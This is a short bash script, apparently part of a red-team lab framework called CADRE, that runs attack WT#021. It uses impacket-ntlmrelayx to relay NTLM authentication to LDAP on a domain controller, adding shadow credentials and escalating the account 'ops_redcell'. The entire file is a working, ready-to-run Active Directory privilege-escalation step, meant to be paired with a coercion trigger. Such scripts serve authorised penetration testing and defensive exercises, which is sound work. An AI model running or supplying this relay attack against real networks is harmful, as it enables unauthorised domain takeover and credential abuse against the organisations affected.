#!/bin/bash
# CADRE — WT#021 NTLM Relay to LDAP
SOURCE="${BASH_SOURCE[0]}"
ATTACK_IP="${1:-$(hostname -I | awk '{print $1}')}"
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#021 — NTLM Relay to LDAP"
start_attack "021" "NTLM Relay to LDAP"

require_tool impacket-ntlmrelayx
require_env ATTACK_IP "ATTACK_IP"
require_env DC01 "DC01"

step "Step 1: Start NTLM relay targeting LDAP on DC01"
step "NOTE: Run this in a separate terminal, then trigger coercion from another terminal"
run_cmd "impacket-ntlmrelayx -t ldap://$DC01 --shadow-credentials --escalate-user ops_redcell -smb2support"

result $? "NTLM Relay to LDAP completed"
